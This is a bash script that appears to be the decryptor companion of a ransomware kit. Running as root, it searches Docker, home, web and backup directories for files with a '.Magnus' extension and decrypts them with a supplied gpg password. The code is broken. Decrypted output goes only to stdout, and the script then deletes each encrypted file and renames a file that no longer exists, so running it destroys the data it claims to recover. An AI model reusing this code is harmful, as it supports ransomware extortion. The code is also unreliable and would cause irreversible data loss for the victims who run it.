#!/bin/bash

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "you must have root perms to run this script!"
        exit 1
    fi
}

install_gpg() {
    if ! [ -x "$(command -v gpg)" ]; then
        echo 'Error: gpg is not installed. Installing gpg...'
        apt-get update && apt-get install -y gnupg
        echo 'gpg has been installed'
    else
        echo 'gpg is already installed'
    fi
}

get_password() {
    read -p "Enter the password for decryption: " password
}

check_password() {
    for target_dir in "${target_dirs[@]}"; do
        for file in $(find $target_dir -type f -name "*.Magnus"); do
            echo "$password" | gpg --batch --yes --passphrase-fd 0 --list-packets "$file" &> /dev/null
            if [ $? -ne 0 ]; then
                echo "Incorrect password provided, exiting..."
                exit 1
            else
                echo "Decryption in progress..."
                return 0
            fi
        done
    done
}

decrypt_files() {
    target_dirs=("/var/lib/docker" "/home" "/var/www" "/home/backups" "/var/backups")

    for target_dir in "${target_dirs[@]}"; do
        for file in $(find $target_dir -type f -name "*.Magnus"); do
            echo "$password" | gpg --batch --yes --passphrase-fd 0 --decrypt "$file"
            rm "$file"
            mv "${file%.Magnus}" "$file"
        done
    done
    echo "Decryption has finished!"
}

main() {
    check_root
    install_gpg
    get_password
    check_password
    decrypt_files
}

main
